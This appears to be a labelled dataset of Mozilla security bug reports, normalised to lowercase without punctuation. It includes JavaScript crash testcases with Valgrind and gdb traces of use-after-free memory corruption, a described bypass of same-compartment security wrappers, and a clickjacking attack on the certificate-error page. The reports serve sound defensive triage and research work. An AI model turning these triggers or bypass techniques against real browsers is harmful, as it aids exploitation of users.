crash js types typeset add with valgrind errors indicating use-after-free the following test crashes on mozilla-central revision c61e7c3a232a options m n a gczeal 2 function testcallprotomethod function x this.valueof new testcallprotomethod return this.value x.prototype.getname function return x var a new x new x new getname new new this new y testcallprotomethod although this particular test crashes with a null pointer deref it seems to be rather a memory corruption original test crashed with non-null pointer also valgrind shows the following errors 5904 invalid read of size 8 5904 at setpropcompiler updatemonitoredtypes polyic.cpp:480 5904 by setpropcompiler update polyic.cpp:613 5904 by js mjit ic setprop js vmframe js mjit ic picinfo polyic.cpp:1911 5904 by in srv/repos/mozilla-central/js/src/debug64/shell/js 5904 by js mjit entermethodjit jscontext js stackframe void js value bool methodjit.cpp:1052 5904 address is 1,704 bytes inside a block of size 1,736 free d 5904 at free vg_replace_malloc.c:366 5904 by js_free utility.h:201 5904 by js mjit jitscript destroychunk js freeop unsigned int bool methodjit.cpp:1332 5904 by js mjit jitscript destroy js freeop methodjit.cpp:1319 5904 by jsscript releasecode js freeop jsscript jitscripthandle methodjit.cpp:1456 5904 by js mjit releasescriptcode js freeop jsscript methodjit.h:908 5904 by jscompartment discardjitcode js freeop jscompartment.cpp:486 5904 by jscompartment sweep js freeop bool jscompartment.cpp:530 5904 5904 invalid read of size 8 5904 at js types typeset add jscontext js types typeconstraint bool jsinfer.cpp:396 5904 by js types typeset addsubset jscontext js types typeset jsinfer.cpp:534 5904 by setpropcompiler updatemonitoredtypes polyic.cpp:480 5904 by setpropcompiler update polyic.cpp:613 5904 by js mjit ic setprop js vmframe js mjit ic picinfo polyic.cpp:1911 5904 by checkstackandentermethodjit jscontext js stackframe void bool methodjit.cpp:1111 5904 address is 29,000 bytes inside a block of size 131,072 free d 5904 at free vg_replace_malloc.c:366 5904 by js gc rundebuggc jscontext jsgc.cpp:3929 marking s-s as this looks like a gc use-after-free	11
crash in cairo_surface_snapshot_copy_on_write during cc after printing a large canvas 1 set user_pref gfx.canvas.azure.enabled true 2 load the testcase 3 print the page to pdf 4 quit firefox result crash during a shutdown cc this might be the cause of bug 740325 i m filing this separately because i m not sure and because the testcase demonstrates that it s a security bug	11
use deferred release for documents in nshtmldocumentsh releasedocument there are a couple classes in nsdomclassinfo.cpp that have a finalizer that calls the release function on a document we ve had trouble with situations like this before since the destructor can possible cause js code to run these calls should use deferred release	11
invalid read from deleted presshell calling canvas stroketext during full-screen transition 1 set user_pref full-screen-api.allow-trusted-requests-only false 2 load the testcase result getprescontext is called on a deleted pres shell usually causing a crash which by coincidence looks like a null pres context deref	11
nuke dead cross-compartment wrappers during brain transplant the basic way we do cross-compartment brain transplants is as follows for each wrapper w that points to the old object wrap the new object in w s compartment which returns a new wrapper w and swap the guts of w and w when we re done with this w now holds the guts of w the problem is that w is still a cross-compartment wrapper and it s no longer in the cross-compartment wrapper map normally everything works okay because w is unreachable and we ll never trace it again however the conservative stack scanner could cause us to trace it again and in that case we can get into a lot of trouble if we trace it after the thing it points to was collected in a compartment gc then we re tracing into bad memory i found this because incremental gc seems to find a lot more of these dead wrappers and trace through them i m guessing they re getting caught in a write barrier somewhere i took advantage of some code that kyle wrote to kill off a cross-compartment wrapper i m pretty sure that the nuke call for origobj is unnecessary since i have n't ever seen it be a cross-compartment wrapper but unless you know better i figure it ca n't hurt	11
oom testing glibc abort due to invalid free in js tokenstream tokenstream the following command crashes on ionmonkey revision 8c54899dae82 dbg build js e const libdir js/src/jit-test/lib a 7046 f js/src/jit-test/tests/debug/breakpoint-resume-01.js	11
do n't sweep native interfaces during compartment gc this is the one aspect of bug 715761 that was correctness-related right now we mark native interfaces when we mark xpcwrappednativeproto and xpcwrappednative we wo n't mark an xpcwrappednativeproto or xpcwrappednative if it s not in a compartment that s being collected however we ll still sweep their native interfaces that s bad this patch skips the sweeping if we are n't collecting all compartments this is kind of an imperfect solution because most gcs now are compartment gcs however it s hard for me to think of a situation where we ll accumulate tons of native interfaces in a short period of time so i think it s okay that they have to wait until a full gc to be swept eventually it would be nice if the maps for native interfaces were per-compartment rather than per-runtime then we could sweep only the ones that were marked but that s a bigger change than i have time for right now the motivation for this is that i saw a stack pop on tryserver today with native interface sweeping at the top so it seems like we might be hitting this recent patches have made it a lot more likely	11
assertion failure compartment mismatched with components.lookupmethod v onclick assertion failure compartment mismatched at js/src/jscntxtinlines.h:237	11
insertelementtxn crash no description provided	11
disk cache does not verify that it correctly serialized/deserialized security info if the security info is corrupted for whatever reason we will silently ignore the corruption this means we may report the wrong security info and/or make same-origin/mixed-content decisions wrongly see 90 as a consequence we will probably have to change the disk cache version blowing away the user s disk cache when they upgrade when we resolve bug 697781 i am marking bug 697781 as depending on this one because we should fix this and any similar issues before doing anything that would cause us to need to bump the disk cache version again	11
assertion uh mdocument does n't match the current inner window document with nearnativestacklimit sync xhr assertion script global object not ready mdocshell getdocument getscriptglobalobject file parser/html/nshtml5treeopexecutor.h line 157 assertion uh mdocument does n't match the current inner window document getcurrentinnerwindow getcurrentinnerwindow getextantdocument mdocument file dom/base/nsglobalwindow.cpp line 1877	11
crash clearalltextrunreferences with font inflation and white-space that preserves newlines 1 create a new profile 2 set user_pref font.size.inflation.mintwips 3000 3 load the testcase in a debug build of firefox 4 quit firefox result crash clearalltextrunreferences during shutdown i think it crashes while trying to evaluate an assertion condition which might explain why it s debug-only	11
workerfinishedrunnable should not be a control runnable consider the following scenario a parent worker creates a child worker the child worker sends two messages to its parent and then closes itself if the parent is running the first message event handler when the delete runnable is posted to the parent thread the parent will enter the operationcallback and run the delete runnable then when the event handler returns and we proceed to the second message we will have a workerprivate that has been deleted ben believes the fix is to make the workerfinishrunnable not be a control runnable	11
assertion failure allocated with typeinference disabled try for let z 0 z 1 evalcx newglobal new-compartment catch e try for y in schedulegc 58 b catch e try e catch e try function h catch e try function this.m.f function catch e try t catch e try p catch e try gc p catch e try function for var v of m catch e try m catch e try function print new function q s let u catch e asserts 64-bit js debug shell on m-c changeset 6470fe2fc4de with m and a at assertion failure allocated setting s-s because gc is on the stack autobisect shows this is probably related to the following changeset the first bad revision is changeset 87736 fbef6a165cf8 user bill mccloskey date fri feb 10 18:32:08 2012 0800 summary bug 723313 stop using conservative stack scanner for vm stack marking r=luke bhackett	11
assertion failure ptrbits 0 at jsval.h:763 or crash js gc cell compartment or js_getmethod the following test asserts/crashes on mozilla-central revision 434f50e70815 options m n a var lfcode new array lfcode.push 3 lfcode.push evaluate mjitchunklimit 5 function slice a b return slice index arraybuffer lfcode.push 0 lfcode.push var arr 0 1 2 3 4 function replacer asserteq arguments.length 2 var key arguments 0 value arguments 1 return value asserteq json.stringify arr replacer 0,1,2,3,4 while true var file lfcode.shift if file undefined break loadfile file function loadfile lfvarx if isnan lfvarx lfruntypeid parseint lfvarx else switch lfruntypeid case 0 evaluate lfvarx break case 3 function newfunc x new function x newfunc lfvarx break crash trace when stepping through assertion program received signal sigsegv segmentation fault in js gc cell compartment this at jsgc.h:984 984 return arenaheader compartment gdb bt 0 in js gc cell compartment this at jsgc.h:984 1 in js compartmentchecker check this obj at jscntxtinlines.h:180 2 in js compartmentchecker check this v at jscntxtinlines.h:190 3 in js compartmentchecker check this args at jscntxtinlines.h:207 4 in js assertsamecompartment js callargs cx t1 at jscntxtinlines.h:254 5 in js calljsnative cx native asserteq jscontext unsigned int jsval args at jscntxtinlines.h:313 6 in js mjit callcompiler generatenativestub this at srv/repos/mozilla-central/js/src/methodjit/monoic.cpp:811 7 in js mjit ic nativecall f ic at srv/repos/mozilla-central/js/src/methodjit/monoic.cpp:1041 8 in 9 in 10 in opt crash program received signal sigsegv segmentation fault js_getmethod cx obj id=140737322830464 gethow=0 vp at srv/repos/mozilla-central/js/src/jsobj.cpp:5144 5144 genericidop op obj getops getgeneric gdb bt 0 js_getmethod cx obj id=140737322830464 gethow=0 vp at srv/repos/mozilla-central/js/src/jsobj.cpp:5144 1 in js_valuetosource cx v at srv/repos/mozilla-central/js/src/jsstr.cpp:3315 2 in js_valuetosource cx value optimized out v at srv/repos/mozilla-central/js/src/jsapi.cpp:533 3 in tosource cx argc=2 vp at srv/repos/mozilla-central/js/src/shell/js.cpp:1160 4 asserteq cx argc=2 vp at srv/repos/mozilla-central/js/src/shell/js.cpp:1190 5 in calljsnative this at jscntxtinlines.h:314 6 js mjit callcompiler generatenativestub this at srv/repos/mozilla-central/js/src/methodjit/monoic.cpp:811 7 in js mjit ic nativecall f ic at srv/repos/mozilla-central/js/src/methodjit/monoic.cpp:1041 8 in 9 in 10 in s-s and sg critical due to gc-related memory safety problem	11
graphite 2 use-after-free crash the testcase is reproducible with a asan enabled build if necessary reload the testcase a few times if you have not a asan enabled build yet follow the instructions described here	11
assertion failure ptrbits 0 at jsval.h:760 or crash compartment the following test asserts/crashes on mozilla-central revision c758cc9b60e5 options m n try function fun new fun 10 function pf true fun fun catch exc1 function eval eval function dowhile_3 eval try dowhile_3 catch e function f test function test try for var i in f catch foopy gc test backtrace in opt build 7571 invalid read of size 8 7571 at void js gc markinternal jsstring jstracer jsstring heap.h:969 7571 by js gc markvalueinternal jstracer js value marking.cpp:329 7571 by js gc markvaluerootrange jstracer unsigned long js value char const marking.cpp:369 7571 by js stackspace mark jstracer stack.cpp:527 7571 by zn2jsl11markruntimeep8jstracerb.clone.246 jsgc.cpp:2325 7571 by beginmarkphase jsruntime jsgc.cpp:2975 7571 by gccycle jsruntime bool long js jsgcinvocationkind jsgc.cpp:3271 7571 by collect jsruntime bool long js jsgcinvocationkind js gcreason reason jsgc.cpp:3719 7571 by gc jscontext unsigned int js value testingfunctions.cpp:52 7571 by js invokekernel jscontext js callargs js maybeconstruct jscntxtinlines.h:426 7571 by js interpret jscontext js stackframe js interpmode jsinterp.cpp:2744 7571 by uncachedinlinecall js vmframe js initialframeflags void bool unsigned int invokehelpers.cpp:376 7571 address is not stack d malloc d or recently free d assuming s-s and sec-critical due to gc related crash furthermore this crash affects mozilla-aurora and mozilla-beta as well	11
assertion failure v togcthing at gc/marking.cpp:327 or crash js gc arenaheader allocated the attached test asserts/crashes on mozilla-central revision 5586efaf687d options m n a crash trace debug build program received signal sigsegv segmentation fault in js gc arenaheader allocated this at gc/heap.h:467 467 js_assert allockind size_t finalize_limit gdb bt 8 0 in js gc arenaheader allocated this at gc/heap.h:467 1 in js gc arenaheader getallockind this at gc/heap.h:497 2 in js gc cell getallockind this at gc/heap.h:941 3 in js gc getgcthingtracekind thing at srv/repos/mozilla-central/js/src/jsgcinlines.h:30 4 in js gc markkind trc thingp kind=jstrace_object at srv/repos/mozilla-central/js/src/gc/marking.cpp:231 5 in js gc markvalueinternal trc v at srv/repos/mozilla-central/js/src/gc/marking.cpp:330 6 in js gc markvalueroot trc v name vm_stack at srv/repos/mozilla-central/js/src/gc/marking.cpp:352 7 in js stackspace markframeslots this trc fp slotsend pc w at srv/repos/mozilla-central/js/src/vm/stack.cpp:501 more stack frames follow gdb x i pc js gc arenaheader allocated const+21 movzbl eax eax gdb info reg eax eax 0 s-s due to gc-related assertion with crash until the crash is confirmed to be harmless and always a null-deref	11
webgl crash when empty string is passed to getuniformlocation getattriblocation or bindattriblocation mozilla webglprogram mapidentifier this bug is related to bug 765161 a square bracket value as the third parameter of bindattriblocation will result in a crash an empty string will also lead to a crash although this bug is most likely caused by the same issue described in bug 765161 i have created a separate bug for this particular method gl.bindattriblocation pg 1	11
use-after-free during gc on shutdown str 1 make b2g desktop build building_b2g 2 start up b2g 3 shut it down i crash during shutdown 100 of the time valgrind tells me the problem is here 24266 invalid read of size 4 24266 at nsbasehashtable nsdepcharhashkey jsobject jsobject isinitialized const nsbasehashtable.h:84 24266 by xpcwrappednativescope tracedomprototypes jstracer xpcwrappednativescope.cpp:777 24266 by tracexpcglobal jstracer jsobject nsxpconnect.cpp:1047 24266 by js gcmarker processmarkstacktop js slicebudget marking.cpp:1181 24266 by js gcmarker drainmarkstack js slicebudget marking.cpp:1225 24266 by markgrayandweak jsruntime jsgc.cpp:3130 24266 by endmarkphase jsruntime jsgc.cpp:3146 24266 by nonincrementalmark jsruntime js jsgcinvocationkind jsgc.cpp:3435 24266 by gccycle jsruntime bool long js jsgcinvocationkind jsgc.cpp:3779 24266 by collect jsruntime bool long js jsgcinvocationkind js gcreason reason jsgc.cpp:3886 24266 by js gc jsruntime js jsgcinvocationkind js gcreason reason jsgc.cpp:3910 24266 by js destroycontext jscontext js destroycontextmode jscntxt.cpp:316 24266 by js_destroycontext jsapi.cpp:1164 24266 by nsxpconnect nsxpconnect nsxpconnect.cpp:114 24266 by nsxpconnect nsxpconnect nsxpconnect.cpp:128 24266 by nsxpconnect release in home/cjones/mozilla/gaia-dbg/toolkit/library/libxul.so 24266 by nsxpconnect releasexpconnectsingleton nsxpconnect.cpp:221 24266 by xpcmoduledtor xpcmodule.cpp:25 24266 by layoutmoduledtor nslayoutmodule.cpp:1202 24266 by nscomponentmanagerimpl knownmodule knownmodule nscomponentmanager.h:175 24266 by nsautoptr nscomponentmanagerimpl knownmodule nsautoptr nsautoptr.h:71 24266 by nstarrayelementtraits nsautoptr nscomponentmanagerimpl knownmodule destruct nsautoptr nscomponentmanagerimpl knownmodule nstarray.h:348 24266 by nstarray nsautoptr nscomponentmanagerimpl knownmodule nstarraydefaultallocator destructrange unsigned int unsigned int nstarray.h:1211 24266 by nstarray nsautoptr nscomponentmanagerimpl knownmodule nstarraydefaultallocator removeelementsat unsigned int unsigned int nstarray.h:931 24266 by nstarray nsautoptr nscomponentmanagerimpl knownmodule nstarraydefaultallocator clear nstarray.h:942 24266 by nscomponentmanagerimpl shutdown nscomponentmanager.cpp:737 24266 by mozilla shutdownxpcom nsiservicemanager nsxpcominit.cpp:680 24266 by ns_shutdownxpcom_p nsxpcominit.cpp:542 24266 by scopedxpcomstartup scopedxpcomstartup nsapprunner.cpp:1103 24266 by xremain xre_main int char nsxreappdata const nsapprunner.cpp:3875 24266 address is 132 bytes inside a block of size 168 free d 24266 at free vg_replace_malloc.c:427 24266 by moz_free mozalloc.cpp:48 24266 by xpcwrappednativescope xpcwrappednativescope mozalloc.h:224 24266 by xpcwrappednativescope killdyingscopes xpcwrappednativescope.cpp:521 24266 by xpcwrappednativescope systemisbeingshutdown xpcwrappednativescope.cpp:604 24266 by nsxpconnect nsxpconnect nsxpconnect.cpp:111 24266 by nsxpconnect nsxpconnect nsxpconnect.cpp:128 24266 by nsxpconnect release in home/cjones/mozilla/gaia-dbg/toolkit/library/libxul.so 24266 by nsxpconnect releasexpconnectsingleton nsxpconnect.cpp:221 24266 by xpcmoduledtor xpcmodule.cpp:25 24266 by layoutmoduledtor nslayoutmodule.cpp:1202 24266 by nscomponentmanagerimpl knownmodule knownmodule nscomponentmanager.h:175 24266 by nsautoptr nscomponentmanagerimpl knownmodule nsautoptr nsautoptr.h:71 24266 by nstarrayelementtraits nsautoptr nscomponentmanagerimpl knownmodule destruct nsautoptr nscomponentmanagerimpl knownmodule nstarray.h:348 24266 by nstarray nsautoptr nscomponentmanagerimpl knownmodule nstarraydefaultallocator destructrange unsigned int unsigned int nstarray.h:1211 24266 by nstarray nsautoptr nscomponentmanagerimpl knownmodule nstarraydefaultallocator removeelementsat unsigned int unsigned int nstarray.h:931 24266 by nstarray nsautoptr nscomponentmanagerimpl knownmodule nstarraydefaultallocator clear nstarray.h:942 24266 by nscomponentmanagerimpl shutdown nscomponentmanager.cpp:737 24266 by mozilla shutdownxpcom nsiservicemanager nsxpcominit.cpp:680 24266 by ns_shutdownxpcom_p nsxpcominit.cpp:542 24266 by scopedxpcomstartup scopedxpcomstartup nsapprunner.cpp:1103 24266 by xremain xre_main int char nsxreappdata const nsapprunner.cpp:3875 24266 by xre_main nsapprunner.cpp:3929 24266 by do_main int char nsbrowserapp.cpp:153 24266 by main nsbrowserapp.cpp:236 24266 marking ss because i have no idea what the extent of the underlying issue is here if i had to guess i would be it s some xpcom thing staying alive too long in b2g but i dunno	11
scopedgfxfeaturereporter uses preference service off the main thread seeing this in the log i/gecko 890 assertion using observer service off the main thread error file home/blassey/src/mozilla-central/xpcom/ds/nsobserverservice.cpp line 95 not seeing it with this patch	11
assertion failure proto getclass ext.outerobject assertion failure proto getclass ext.outerobject at js/src/jsinferinlines.h:1162 this assertion was added in bug 719841	9
same-compartment security wrappers can be trivially bypassed by passing them to another compartment sigh they re totally fucked i do n't know how we did n't think of this before js wrapping does n't know about scsws so our strategy is just inject them in places like nativeinterface2jsobject and hope that nobody can actually touch the object this works mostly occasionally we find a hole see bug 737559 but while debugging cpg wrapper reparenting fallout i realized that there s a simple workaround cross-compartment wrappers do n't go through scsws in most cases but rather have the filtering policy built directly into them so when an object is wrapped cross-compartment the scsw is stripped off but when the object is read back the js engine has no idea that there was ever supposed to be a scsw there so it just says hey the underlying object here is in the same compartment we re wrapping for no wrappers needed with compartment-per-global i.e nightly this is super easy make happen just load up a trivial iframe define the security-checked property on its contentwindow and read it back again boom i wrote a testcase to confirm that this works without compartment-per-global i.e aurora beta esr and release it s a tiny bit trickier since normally an origin only gets one compartment to play with but this can be easily defeated by making the trivial iframe same-origin via document.domain rather than by its true origin which puts it in a separate compartment i did n't write a testcase for this because it s 11pm and i m tired but i do n't see why it would n't work just as well on nightly we recently upped the ante by making the components object protected by scsws bug 735280 so this would in theory give full components access to web content but thankfully i do n't think gabor ever got around to removing the old-style caps check did you gabor so i think we re safe there for now but we re still sitting ducks as far as location and sows are concerned so yeah we need a story here pronto	9
mitigate clickjacking of about certerror a site colluding with a mitm attacker can show a fake about certerror page with the add exception button of a real about certerror page for another site showing through an iframe if the user judges the front site unimportant and fails to recheck the hostname in the add security exception dialog his/her communications with the back site are compromised i have linked a demo for firefox 3.6 and 4 that targets www.cacert.org so it will not work if you have the cacert root enabled or already have a cert override for this site the demo assumes browser.xul.error_pages.expert_bad_cert is enabled in a real attack i think one could avoid this assumption by supplying a cert with a related hostname so that the technical details section of the back page expands and then letting the entire i understand the risks section including the toggle show through the only problem is that the width of the errorpagecontainer may change when this section opens and i m not sure how to make it change on both the front and back pages please consider mitigating this attack one possibility when about certerror loads in a frame it could say in place of the button to add an exception you need to a open this page in a new tab a i m marking the bug private as a precaution please feel free to open it if you judge that it does not need this protection	2
crash decompile with let expressions the following test crashes on mozilla-central revision 3fa30b0edd15 options m n a 32 bit opt build let 1 3 let i new i print i valgrind errors 59269 conditional jump or move depends on uninitialised value s 59269 at decompile sprintstack unsigned char int jsopcode.cpp:5077 59269 by decompilecode jsprinter jsscript unsigned char unsigned int unsigned int jsopcode.cpp:5404 59269 by decompileexpression jscontext jsscript jsfunction unsigned char jsopcode.cpp:5810 59269 by js_decompilevaluegenerator jsopcode.cpp:5699 59269 by js_reportvalueerrorflags jscontext unsigned int unsigned int int js value const jsstring char const char const jsopcode.h:401 59269 by js_reportisnotfunction jscontext js value const unsigned int jsfun.cpp:1383 59269 by js invokeconstructorkernel jscontext js callargs const jsinterp.cpp:605 59269 by js interpret jscontext js stackframe js interpmode jsinterp.cpp:2682 59269 by js runscript jscontext jsscript js stackframe jsinterp.cpp:472 59269 by js execute jscontext jsscript jsobject js value jsinterp.cpp:670 59269 by js_executescript jsapi.cpp:5247 59269 by process jscontext jsobject char const bool js.cpp:478 twice 59269 invalid read of size 1 59269 at decompile sprintstack unsigned char int jsopcode.cpp:5077 59269 by decompilecode jsprinter jsscript unsigned char unsigned int unsigned int jsopcode.cpp:5404 59269 by decompileexpression jscontext jsscript jsfunction unsigned char jsopcode.cpp:5810 59269 by js_decompilevaluegenerator jsopcode.cpp:5699 59269 by js_reportvalueerrorflags jscontext unsigned int unsigned int int js value const jsstring char const char const jsopcode.h:401 59269 by js_reportisnotfunction jscontext js value const unsigned int jsfun.cpp:1383 59269 by js invokeconstructorkernel jscontext js callargs const jsinterp.cpp:605 59269 by js interpret jscontext js stackframe js interpmode jsinterp.cpp:2682 59269 by js runscript jscontext jsscript js stackframe jsinterp.cpp:472 59269 by js execute jscontext jsscript jsobject js value jsinterp.cpp:670 59269 by js_executescript jsapi.cpp:5247 59269 by process jscontext jsobject char const bool js.cpp:478 59269 address is 0 bytes after a block of size 64 alloc d 59269 at malloc vg_replace_malloc.c:236 59269 by initsprintstack jscontext sprintstack jsprinter unsigned int utility.h:173 59269 by decompilecode jsprinter jsscript unsigned char unsigned int unsigned int jsopcode.cpp:5379 59269 by decompileexpression jscontext jsscript jsfunction unsigned char jsopcode.cpp:5810 59269 by js_decompilevaluegenerator jsopcode.cpp:5699 59269 by js_reportvalueerrorflags jscontext unsigned int unsigned int int js value const jsstring char const char const jsopcode.h:401 59269 by js_reportisnotfunction jscontext js value const unsigned int jsfun.cpp:1383 59269 by js invokeconstructorkernel jscontext js callargs const jsinterp.cpp:605 59269 by js interpret jscontext js stackframe js interpmode jsinterp.cpp:2682 59269 by js runscript jscontext jsscript js stackframe jsinterp.cpp:472 59269 by js execute jscontext jsscript jsobject js value jsinterp.cpp:670 59269 by js_executescript jsapi.cpp:5247 the test does not always crash but it has an 80-90 chance to do so marking s-s because this seems to be an out-of-bounds read assigned to luke for now as he has been looking on this issue already and provided the smaller/more reliable testcase d	11
assertion failure obj getslotref slot this function f y x for var i 0 i x.length i y i return y evalcx undefined.function e f evalcx lazy asserts js debug shell on m-c changeset 6ad95e65d74d without any cli arguments at assertion failure obj getslotref slot this s-s because valgrind shows invalid reads in an opt build autobisect shows this is probably related to the following changeset the first bad revision is changeset 93639 fbff86190de6 user brian hackett date wed may 09 14:14:10 2012 0700 summary do n't throw away jit code for compartments in web pages displaying animations bug 750834 r=billm	11
assertion obj must be a wrapper with document.open during domnoderemoved event assertion obj must be a wrapper is_wrapper_class js getobjectclass obj js getobjectclass obj xpc_wn_tearoff_jsclass file js/xpconnect/src/xpcquickstubs.cpp line 374	11
crash with gradient hugeness moz-appearance statusbar no description provided	11
crash in gfxcontext gfxcontext this bug was filed from the socorro interface and is report bp-0101e134-9558-4f01-97f2-18c332120710 found when looking at crash stats for the webapp runtime do n't have reproduction steps for this	11
random indexeddb crashes with trial tool if i open up the trial tool at example=/indexeddb/trialtool/moz_indexeddb.html selected db and then do a bunch of running of various testcases in somewhat random orders i only used prereqs open open+1 delete close create obj store delete obj store list obj store did n't touch anything below that i can often get a crash when i reload the page i ve reproduced it twice with the following two different crash reports had a harder time doing it a third time 2012-07-18 m-c nightly	11
xhr use-after-free of js when we landed the attached tweak to a test in 771666 this random orange started occuring it does n't seem to happen in asan builds but seems to be 100 reproducible if you run the test twice in one session with extra_test_args repeat=1 assertion failure allocated at dist/include/gc/heap.h:497 program received signal sigsegv segmentation fault js gc arenaheader getallockind this at dist/include/gc/heap.h:497 497 js_assert allocated gdb bt 0 js gc arenaheader getallockind this at dist/include/gc/heap.h:497 1 in js gc cell getallockind this at home/johns/moz/moz-git/js/src/gc/heap.h:935 2 in js gc getgcthingtracekind thing at home/johns/moz/moz-git/js/src/jsgcinlines.h:30 3 in js_getgcthingtracekind thing at home/johns/moz/moz-git/js/src/jsgc.cpp:1760 4 in xpc_gcthingisgrayccthing thing at home/johns/moz/moz-git/js/xpconnect/src/nsxpconnect.cpp:574 5 in childfinder notejschild this child at home/johns/moz/moz-git/xpcom/base/nscyclecollector.cpp:1991 6 in nsscriptobjecttracer notejschild ascriptthing name mresultjson aclosure at home/johns/moz/ff-dbg/xpcom/build/nscyclecollectionparticipant.cpp:16 7 in nsxmlhttprequest cyclecollection traceimpl void void void char const void void from home/johns/moz/ff-dbg/dist/bin/libxul.so 8 in nsdomeventtargethelper cyclecollection traverseimpl nsdomeventtargethelper cyclecollection void nscyclecollectiontraversalcallback from home/johns/moz/ff-dbg/dist/bin/libxul.so 9 in nsxhreventtarget cyclecollection traverseimpl nsxhreventtarget cyclecollection void nscyclecollectiontraversalcallback from home/johns/moz/ff-dbg/dist/bin/libxul.so 10 in nsxmlhttprequest cyclecollection traverseimpl nsxmlhttprequest cyclecollection void nscyclecollectiontraversalcallback from home/johns/moz/ff-dbg/dist/bin/libxul.so 11 in nscyclecollectionparticipant traverse this p cb at dist/include/nscyclecollectionparticipant.h:262 12 in mayhavechild o cp at home/johns/moz/moz-git/xpcom/base/nscyclecollector.cpp:2022 13 in nspurplebuffer removeskippable this removechildlessnodes=true at home/johns/moz/moz-git/xpcom/base/nscyclecollector.cpp:2042 14 in nscyclecollector forgetskippable this removechildlessnodes=true at home/johns/moz/moz-git/xpcom/base/nscyclecollector.cpp:2066 15 in nscyclecollector_forgetskippable aremovechildlessnodes=true at home/johns/moz/moz-git/xpcom/base/nscyclecollector.cpp:3217 16 in fireforgetskippable asuspected=496 aremovechildless=true at home/johns/moz/moz-git/dom/base/nsjsenvironment.cpp:3033 17 in cctimerfired atimer aclosure at home/johns/moz/moz-git/dom/base/nsjsenvironment.cpp:3268	11
crash at libc-2.15.so at mapsgl with webgl.msaa-level 1 str 1 visit about config 2 set the pref webgl.msaa-level 1 i did n't do this manually at first this was already set in my profile for some reason not sure why 3 visit which should enable mapsgl actual results crash with this printed to my terminal firefox nvc0_surface.c:218 nvc0_resource_copy_region assertion src nr_samples dst nr_samples failed sample crash reports bp-63b77e54-c5e4-45c6-b933-c26a32120730 bp-5ec26eac-8033-4661-977d-b52222120730	11
assertion failure infer failure missing type pushed 0 int with destructuring assignment the following test asserts on mozilla-central revision e5e66f40c35b options n m a function f var x e function h for var i 0 i 5 i x i 2 h asserteq x 8 f this bug strongly reminds me of bug 685321 which also had a destructuring assignment s-s due to infer failure	11
hunt down black gray edges in the js heap billm was there a bug for this i ca n't remember one so i m making one to attach my current wip	11
assertion weird scope returned with document.write twice dataset adoptnode assertion weird scope returned betterscope newscope file js/xpconnect/src/nsxpconnect.cpp line 1771 previous episodes bug 716383 bug 731471	11
assertion failure ismarkedorallocated static_cast cell thingp at jsgc.cpp:4284 the attached test asserts on mozilla-central revision 17af008937e3 options m n a	11
assertion failure addr cell cellsize 0 at jsgc.h:859 or crash js gc cell compartment the following test asserts/crashes on mozilla-central revision 75c7378c87b6 options m n a gczeal 4 try jstestdriverend catch exc1 evaluate schedulegc 10 for var i=0 i 3 i var obj first first second second for var elem in obj x.push count backtrace in debug build after stepping through assertion program received signal sigsegv segmentation fault in js gc cell compartment this at jsgc.h:984 984 return arenaheader compartment gdb bt 8 0 in js gc cell compartment this at jsgc.h:984 1 in js gc checkmarkedthing js types typeobject trc thing at srv/repos/mozilla-central/js/src/jsgcmark.cpp:80 2 in js gc markinternal js types typeobject trc thingp at srv/repos/mozilla-central/js/src/jsgcmark.cpp:102 3 in js gc mark js types typeobject trc thing name type at srv/repos/mozilla-central/js/src/jsgcmark.cpp:141 4 in js gc marktypeobject trc thing name type at srv/repos/mozilla-central/js/src/jsgcmark.cpp:217 5 in js objectimpl markchildren this trc at srv/repos/mozilla-central/js/src/vm/objectimpl.cpp:157 6 in js gc markchildren trc obj at srv/repos/mozilla-central/js/src/jsgcmark.cpp:675 7 in js tracechildren trc thing kind=jstrace_object at srv/repos/mozilla-central/js/src/jsgcmark.cpp:1160 more stack frames follow gdb x i pc js gc cell compartment const+17 mov eax eax gdb info reg eax eax 623194112 assuming s-s and sg critical due to use-after-free condition	11
assertion wrapper already in new scope with location.hash document.open to reproduce save both testcase files then open outer.html assertion wrapper already in new scope newmap find wrapper getidentityobject file js/xpconnect/src/xpcwrappednative.cpp line 1636 might be a regression from cpg	11
crash js getobjectclass jsobject const nsxpconnect getnativeofwrapper assertion bad param ajsobj file work/mozilla/builds/nightly/mozilla/js/xpconnect/src/nsxpconnect.cpp line 1429 assertion bad param obj file work/mozilla/builds/nightly/mozilla/js/xpconnect/src/xpcwrappednative.cpp line 1786 nightly debug crash js getobjectclass jsobject const nightly opt crash nsxpconnect getnativeofwrapper bp-412995f0-045d-485c-92aa-daf952120504 bp-c96d3eee-924d-41d4-8a20-7e6832120504 marking s-s since bug 729812 is s-s but this is a crash at null this may be a dupe of that though	11
assertion failure cx compartment this with document.write during domattrmodified during domattrmodified assertion nshtmldocument reset wyciwyg channel still exists mwyciwygchannel file content/html/document/src/nshtmldocument.cpp line 329 that first assertion might be bug 675518 or bug 680086 after domattrmodified assertion failure cx compartment this at js/src/jscompartment.cpp:124	11
assertion failure ismarkedorallocated static_cast cell thing at js/src/jsgc.cpp:4399 the following test asserts on mozilla-central revision 4c6d01c92dcc options m n function printstatus msg function toprinted value value value.replace n/g nl function reportcompare expected actual description printstatus expected value toprinted expected matched actual value toprinted actual var ubound 0 var statusitems var actual var actualvalues var expect var expectedvalues testthis x testthis abc testthis x testthis date 12345 testthis x testthis 1 testthis x testthis void 0 testthis x testthis 1,2,3,4,5 1 gczeal 4 testthis x 1 checkthis function y return y+1 abc checkthis f abc function testthis sinvalidsyntax expectedvalues ubound expect actualvalues ubound actual ubound function checkthis svalidsyntax for var i=0 i ubound i reportcompare expectedvalues i actualvalues i statusitems i var actualvalues for var i=0 i ubound i reportcompare expectedvalues i actualvalues i statusitems i might be another verifier debug-only bug but i m marking s-s until this is confirmed	11
